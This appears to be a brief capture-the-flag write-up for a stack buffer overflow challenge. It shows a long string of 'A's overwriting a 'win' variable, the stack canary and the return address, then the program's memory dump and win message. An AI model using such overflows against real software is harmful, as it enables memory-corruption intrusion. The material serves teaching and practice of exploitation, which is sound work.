In this challenge we have to change the value of the `win` variable

The program accepts a string of any length which means we can overflow the buffer to get to the address where win variable is defined and change its value

Payload (The string could be of any length)
    
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


    The program's memory status:
    - the input buffer starts at 0x7ffdb347aef0
    - the saved frame pointer (of main) is at 0x7ffdb347af40
    - the saved return address (previously to main) is at 0x7ffdb347af48
    - the saved return address is now pointing to 0x4141414141414141.
    - the canary is stored at 0x7ffdb347af38.
    - the canary value is now 0x4141414141414141.
    - the address of the win variable is 0x7ffdb347af30.
    - the value of the win variable is 0x41414141.
    
    You win! Here is your flag:
